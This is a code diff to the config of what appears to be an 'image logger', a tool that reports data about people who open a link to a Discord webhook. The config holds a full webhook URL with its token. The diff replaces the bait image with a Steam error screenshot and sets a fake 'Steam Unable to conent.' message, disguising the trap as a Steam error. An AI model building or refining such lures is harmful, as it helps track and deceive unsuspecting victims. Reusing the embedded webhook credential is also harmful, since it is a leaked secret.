@@ -13,7 +13,7 @@ __author__ = "TSJohnpork"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1330982655722000435/_ZhFTuLKSuM9snwtMHBXceNcPHjmquhHM556GjWvpp1lUtFuna5md2rQid_ZqCiyu98o",
-    "image": "https://i.scdn.co/image/ab67616d00001e02d03abb70558ec7898c69b57b", # You can also have a custom image by using a URL argument
+    "image": "https://blog.pcrisk.com/images/stories/blog/2023/steam-error-code-118/steam-error-code-118-v2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage":True, # Enable the custom message?
-        "message": "Balls", # Message to show
+        "message": "Steam Unable to conent. ", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
